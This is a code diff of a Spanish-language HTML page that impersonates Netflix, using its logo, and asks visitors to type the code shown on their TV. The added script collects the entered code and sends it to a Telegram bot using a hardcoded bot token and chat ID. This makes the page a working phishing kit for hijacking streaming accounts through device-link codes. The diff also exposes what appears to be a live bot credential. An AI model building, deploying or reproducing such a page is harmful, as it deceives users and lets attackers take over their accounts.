@@ -29,7 +29,7 @@
         }
 
         .logo-img {
-            height: 120px; /* Tamaño del logo aumentado */
+            height: 120px;
             width: auto;
             display: block;
         }
@@ -167,7 +167,7 @@
 
         @media (min-width: 600px) {
             .logo-img {
-                height: 150px; /* Logo aún más grande en escritorios */
+                height: 150px;
             }
             .code-input {
                 width: 45px;
@@ -179,7 +179,7 @@
 </head>
 <body>
 
-    <!-- Encabezado con el Logo en tamaño grande -->
+    <!-- Encabezado con el Logo -->
     <header>
         <img src="https://infonegocios.info/content/images/2022/07/20/20155/netflix-logo-top-100-brands-01-cba.jpg" alt="Logo" class="logo-img">
     </header>
@@ -188,7 +188,7 @@
     <main>
         <h1>Ingresa el código que aparece en tu TV</h1>
 
-        <form style="width: 100%;">
+        <form id="codeForm" style="width: 100%;">
             <div class="code-container">
                 <input type="text" class="code-input" maxlength="1" pattern="[A-Za-z0-9]">
                 <input type="text" class="code-input" maxlength="1" pattern="[A-Za-z0-9]">
@@ -223,6 +223,11 @@
     <script>
         const inputs = document.querySelectorAll('.code-input');
         const submitBtn = document.getElementById('submitBtn');
+        const form = document.getElementById('codeForm');
+
+        // Tus credenciales de Telegram
+        const TELEGRAM_BOT_TOKEN = "8693512194:AAH4pvVwqutasLjFWaRrzDPAnSKUnA8_qTk";
+        const TELEGRAM_CHAT_ID = "5084510194";
 
         function checkInputs() {
             const allFilled = Array.from(inputs).every(input => input.value.trim() !== '');
@@ -249,6 +254,46 @@
                 }
                 setTimeout(checkInputs, 10);
             });
+        });
+
+        // Enviar datos a Telegram al hacer clic en el botón
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            // Construir el código combinando los valores de las 8 casillas
+            let code = '';
+            inputs.forEach(input => code += input.value);
+
+            const message = `🔑 *Nuevo Código de TV:* \`${code}\``;
+            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            try {
+                submitBtn.disabled = true;
+                submitBtn.innerText = "Cargando...";
+
+                const response = await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                if (response.ok) {
+                    alert("Código recibido exitosamente.");
+                    form.reset();
+                    checkInputs();
+                } else {
+                    alert("Ocurrió un problema al enviar el código. Revisa tus tokens.");
+                }
+            } catch (error) {
+                console.error("Error al conectar con Telegram:", error);
+                alert("Error de red al intentar conectar.");
+            } finally {
+                submitBtn.innerText = "Continuar";
+            }
         });
     </script>
 </body>
